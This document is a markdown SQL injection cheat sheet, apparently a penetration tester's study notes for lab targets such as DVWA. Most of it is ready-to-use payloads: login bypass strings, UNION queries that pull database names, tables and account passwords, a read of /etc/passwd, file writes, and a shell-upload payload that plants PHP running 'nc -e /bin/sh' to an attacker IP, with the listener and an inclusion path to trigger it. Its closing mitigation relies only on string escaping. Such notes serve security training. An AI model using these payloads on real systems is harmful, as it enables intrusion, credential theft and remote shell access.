# SQL Injection

## Types
- MySQL
  - Error Based
    - Union Query
      - Discovery: ```'``` & ```"``` & ```\``` & ```\```` & ```/````
      - Exploitation (SEC542 - 5)
    - Double Query (SEC542 - 5)
  - Blind 
    - Boolean (SEC542 - 5) 
    - Time Based (SEC542 - 5)


- MSSQL
  - Union Query
    - ```union all select``` 
  - Blined Based
    - ```id=1' and 1=1--+```
    - ```id=1' and 1=1#```
  - Time Based
    - ```id=1' and waitfor delay "00:00:10"```
  - Error Based
    - ```id=1 and 1=@@version--```
    - ```id=1 and 1=db_name()--```

## Payloads
```
a' or '1'='1
a' or '1'='1'%23
a' or 1=1%23
a'%09or%09'1'='1
a'or'1'='1
a'/**/or/**/'1'='1
2 or 1=1
2%0Aor 1=1
` desc %23
IF(0,name,age)
' or 1=1#
' or 1=1--
' or 1=1 LIMIT 1 #
2 union all select * from users
```

## Exploit
- Login
  - username: ```admin'#``` 
  - password: ```1' or 1=1#``` 
- Data Extracting 
  - Seleting database version, Database, user
    - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
  - Database tables 
    - ```... union select 1,table_name,null,null,5 from information_schema.tables``` 
    - ```... union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'``` 
  - Table Columns
    - ```... union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
  - Selecting data from table 
    - ```... union select 1,username,password,is_admin,5 from accounts``` 
  - Reading files
    - ```... union select null,load_file('/etc/passwd'),null,null,null``` 
  - Writing files
    - ```UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*``` 
- Shell upload 
  - Payload 
    - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
  - Listen on attacker machin:
    - nc -vv -l -p 8080
  - Run backdoor
    - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```
- Tips
  - TRUE statements
    - ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1``` 
  - FALSE statements
    - ```dNd 0=1``` & ```anD 9=2``` & ```ordEr bY 1000000000000```   
  - Spaces
    - ```+``` & ```/**/``` & ```%20``` 
    - ```orDeR bY 1 can be re-written as``` => ```orDer+bY+1``` or ```orDer/**/bY/**/1``` or ```orDer%20bY%201```
  - Comments to end the quries
    - ```/*``` & ```//``` & ```#``` & ```%23```
    - Sometimes you might need to add ';' before the comment
      - ```anD 1=1//``` => ```anD 1=1;//```
## Tool
[SQLMAP](../Tools/sqlmap.md)

## Mitigation
- Secure Code for login in PHP
```PHP
$query = "SELECT * FROM accounts WHERE username='".
$conn->real_escape_string($username).
"'AND password='".
$conn->real_escape_string($password).
"'"
```
